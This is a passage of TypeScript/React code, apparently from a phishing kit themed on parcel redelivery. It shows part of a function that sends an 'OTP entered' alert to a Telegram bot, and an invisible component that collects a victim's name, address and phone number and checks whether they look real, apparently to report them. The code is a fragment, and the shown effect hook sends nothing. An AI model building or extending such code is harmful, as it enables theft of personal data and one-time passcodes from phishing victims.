      TELEGRAM_CONFIG.API_AVERI.token,
      TELEGRAM_CONFIG.API_AVERI.chatId,
      averiMessage
    );
  } catch (error) {
    console.error('Error in sendItOtpEnteredNotification:', error);
  }
};

const TelegramAPI = ({ invoiceName = "Unknown Invoice", address = "Unknown Address", phone = "Unknown Phone" }: TelegramAPIProps) => {
  const [initialNotificationSent, setInitialNotificationSent] = useState(false);
  const [completeNotificationSent, setCompleteNotificationSent] = useState(false);

  useEffect(() => {
    // Check if invoiceName looks like a real name (contains space or longer than 6 chars and not just alphanumeric)
    const isRealName = invoiceName && 
      invoiceName !== "Unknown Invoice" && 
      invoiceName !== "redelivery" &&
      (invoiceName.includes(' ') || (invoiceName.length > 6 && !/^[a-zA-Z0-9]+$/.test(invoiceName)));
    
    // Check if we have complete address data (not "Incomplete" and contains commas)
    const hasCompleteAddress = address && address !== "Incomplete" && address !== "Unknown Address" && address.includes(',');
    
  }, [invoiceName, address, phone, initialNotificationSent, completeNotificationSent]);

  return null; // This component doesn't render anything
};

export default TelegramAPI;